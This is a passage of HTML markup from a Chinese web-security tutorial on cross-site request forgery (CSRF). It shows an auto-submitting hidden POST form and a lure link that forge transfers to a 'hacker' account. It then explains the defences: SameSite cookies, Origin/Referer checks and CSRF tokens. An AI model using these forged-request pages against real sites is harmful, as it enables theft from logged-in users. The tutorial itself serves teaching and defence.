的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去了。</p>\n<h3 id="自动发起-post-请求"><a href="#%E8%87%AA%E5%8A%A8%E5%8F%91%E8%B5%B7-post-%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>自动发起 POST 请求</h3>\n<p>除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="39590160107473445000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <h1>黑客的站点：CSRF 攻击演示</h1>\n    <form id=&quot;hacker-form&quot; action=&quot;https://time.geekbang.org/sendcoin&quot; method=&quot;POST&quot;>\n      <input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;hacker&quot; />\n      <input type=&quot;hidden&quot; name=&quot;number&quot; value=&quot;100&quot; />\n    </form>\n    <script>\n      document.getElementById(\'hacker-form\').submit();\n    </script>\n  </body>\n</html>`, `39590160107473445000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>黑客的站点：CSRF 攻击演示<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker-form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n      document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'hacker-form\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>在这段代码中，我们可以看到黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。</p>\n<h3 id="引诱用户点击链接"><a href="#%E5%BC%95%E8%AF%B1%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>引诱用户点击链接</h3>\n<p>除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="62304287949504200000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<div>\n  <img width=&quot;150&quot; data-src=&quot;http://jpg&quot; />\n  <a href=&quot;https://time.geekbang.org/sendcoin?user=hacker&amp;number=100&quot; target=&quot;_blank&quot;>\n    点击下载美女图片\n  </a>\n</div>`, `62304287949504200000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>150<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin?user=hacker&amp;number=100<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n    点击下载美女图片\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户上了。</p>\n<p>以上三种就是黑客经常采用的攻击方式。如果当用户登录了极客时间，以上三种 CSRF 攻击方式中的任何一种发生时，那么服务器都会将一定金额的极客币发送到黑客账户。</p>\n<p>到这里，相信你已经知道什么是 CSRF 攻击了。和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击</p>\n<h2 id="如何防止-csrf-攻击"><a href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-csrf-%E6%94%BB%E5%87%BB" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>如何防止 CSRF 攻击</h2>\n<p>了解了 CSRF 攻击的一些手段之后，我们再来看看 CSRF 攻击的一些“特征”，然后根据这些“特征”分析下如何防止 CSRF 攻击。下面是我总结的发起 CSRF 攻击的三个必要条件：</p>\n<ol>\n<li>目标站点一定要有 CSRF 漏洞；</li>\n<li>用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；</li>\n<li>需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。</li>\n</ol>\n<p>满足以上三个条件之后，黑客就可以对用户进行 CSRF 攻击了。这里还需要额外注意一点，与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。</p>\n<p>要让服务器避免遭受到 CSRF 攻击，通常有以下几种途径。</p>\n<h3 id="cookie-的-samesite-属性"><a href="#cookie-%E7%9A%84-samesite-%E5%B1%9E%E6%80%A7" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Cookie 的 SameSite 属性</h3>\n<p>通过上面的介绍，相信你已经知道了黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据，因此要阻止 CSRF 攻击，我们首先就要考虑在 Cookie 上来做文章。</p>\n<p>通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：</p>\n<ul>\n<li>如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；</li>\n<li>如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。</li>\n</ul>\n<p>而我们要聊的 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。</p>\n<p>那 SameSite 是怎么防止 CSRF 攻击的呢？</p>\n<p>在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-ea453.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 8.08383233532934%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsSAAALEgHS3X78AAAATElEQVQI1z3L0QrAIAiF4d7/QQejmVrTjneryQaHnw/EIsNI+sV6kFfxk3dZexNd03EniCWxTulKrcwIRxhgSOw68G3bZvxefV/gEQ8BNXI05ZXSTwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 49 35" title="" data-src="/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-fee1c.png" data-srcset="/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-a67b7.png 200w,\n/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-0b187.png 400w,\n/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-fee1c.png 800w,\n/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-b1a91.png 1200w,\n/static/2021-07-15-14-49-35-e5b4e10ae805ed554bf4890fafb3bf02-ea453.png 1336w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>SameSite 选项通常有 Strict、Lax 和 None 三个值。</p>\n<ul>\n<li>Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。</li>\n<li>Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。</li>\n<li>而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。</li>\n</ul>\n<blockquote>\n<p>对于防范 CSRF 攻击，我们可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。</p>\n</blockquote>\n<h3 id="验证请求的来源站点"><a href="#%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9D%A5%E6%BA%90%E7%AB%99%E7%82%B9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>验证请求的来源站点</h3>\n<p>接着我们再来了解另外一种防止 CSRF 攻击的策略，那就是在服务器端验证请求来源的站点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。那么该怎么判断请求是否来自第三方站点呢？</p>\n<p>这就需要介绍 HTTP 请求头中的 Referer 和 Origin 属性了。</p>\n<p>Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如我从极客时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-36fa6.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 64.36170212765958%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsSAAALEgHS3X78AAABnElEQVQoz5WSS0sDMRDH9wt68eJHE1HQk0fBkwcLKioIKlgRq33sI+6z3WyySTbZ7T7qJPVR9VJ/DEPIZJiZ/MeSUiazTJUVIJcoBVZ9UpZfx2q+Qtd1Flw5jhvGUUZIadDJUuaMFVIKITgHJxjjEFr8RCe/DAbD0asfBJRSxlhd190K8Gjp/2LB01SDIU0UAgoyzuFysQYWtOT7fhTFcIBum6Zp27ZumvoTGO/7XH+jZ4YYQm9hGMVxQgiBukIUK0huhgZvvqBYRsFBDd2253mTySSOY4yheb5YG115PB5Dvh+EKcZKKS6Krpk/B3L7sti9Bi+HsaorkECZjxfGm8o62XbGtmu7yPGQi95cP0in0fFttLlHt/bpxg7tPWWCptMZTpLpbJaCQRlo2aqUQqNh6Lo4CivOJMkkJa0g54/pwU1x1FeHdwqRxgj2p+0yp6+9k9HZqXN1jq4vcP8eLH24w08PXfshWGek/sWHzg7yHM9LMSmkWvwHPbNt2yA1qJUkSW60ynO2XExCaZYRuKQ010tqdKN6kxhsxDvlMOIkpAs/mAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 51 07" title="" data-src="/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-fee1c.png" data-srcset="/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-a67b7.png 200w,\n/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-0b187.png 400w,\n/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-fee1c.png 800w,\n/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-b1a91.png 1200w,\n/static/2021-07-15-14-51-07-edfdc146fae24df12625ba13b49620be-36fa6.png 1504w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考 Referrer Policy</p>\n<p>但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属性，在一些重要的场合，比如通过 XMLHttpRequest、Fetch 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-4eb3c.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 68.80222841225626%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACRklEQVQoz4VT2W7TQBT1L/MfIMELSIgHHnhBQrQoSKBuIiQthS4hbWhrO15mxp7FsR17vNuxzXUrIVZxdB9G13PuOXOurAQrTpDhEtPjpCpS4flSZlUJKOoyh0NTV3U9NJqm2fyEvu+VgxOyNba3J+zVB3p2E9DzkTF5QY5fhvrx9kw+3PUf7AQzK2nKrNm0/a9QjmbW+NQ+mtPxGbGoFC4ytG8E6eHK09xoQbIbXsdFB1e7/nconDkYmS5BroOyNHZcalo24yKOkzyVdZE2Vd53f8FAppRpS0PTl6qmr9cRY4wQEgRhFEVJmhZlWddN96fonTLjfLk0oAzTTNOMc65rOsaYMe5SmiRp27b9P6AIIVYrPwzDLM8hT0YZTKGMxXHc/w8KKBDiwFP9IBjIjFmWBWQpwfUg27YdLKZtoVo4/FjYnbJn2QhuJ0lSVZXvBxgPw2wEIBgCcFzsuIg4UPDFQti2EecCpgxk04QOKYqibmrhhw7zmBcwz6fC58ILhCMDnq5XcSBkIHyPI+xAvwYy+ISo9du0pZQe1lzjwr4+F+hqE7t5lu4s+63L9s08370u3i5Kwx8M3+WvgAFrgA3rTWTkTJ/jvUd0/Ng7fOZPn9Cv70aTq+2D2Wh6c38vubcln07kJ6PcV6u529yuCvI1rVuy5OoX4/S9u/i4tk5zuqjovBfnvTjpU/wZd/t6s3OVjS7z1xf11KiHtMGwqmqqqkO+fBUYyKEiFH68lnlabmTexPlm+Fkymcl1nkSbMquyqGub79/tAKfsmN5vAAAAAElFTkSuQmCC\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 15 14 51 34" title="" data-src="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-fee1c.png" data-srcset="/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-a67b7.png 200w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-0b187.png 400w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-fee1c.png 800w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-b1a91.png 1200w,\n/static/2021-07-15-14-51-34-c78cd79628b933bf374e84f5c1efdce3-4eb3c.png 1436w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>从上图可以看出，Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。</p>\n<p>因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。</p>\n<h3 id="csrf-token"><a href="#csrf-token" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSRF Token</h3>\n<p>除了使用以上两种方式来防止 CSRF 攻击之外，还可以采用 CSRF Token 来验证，这个流程比较好理解，大致分为两步。</p>\n<p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="71894973640602800000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<!DOCTYPE html>\n<html>\n  <body>\n    <form action=&quot;https://time.geekbang.org/sendcoin&quot; method=&quot;POST&quot;>\n      <input type=&quot;hidden&quot; name=&quot;csrf-token&quot; value=&quot;gdshtr45q1g&quot; />\n      <input type=&quot;text&quot; name=&quot;user&quot; />\n      <input type=&quot;text&quot; name=&quot;number&quot; />\n      <input type=&quot;submit&quot; />\n    </form>\n  </body>\n</html>`, `71894973640602800000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://time.geekbang.org/sendcoin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gdshtr45q1g<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p>\n<h2 id="总结-5"><a href="#%E6%80%BB%E7%BB%93-5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 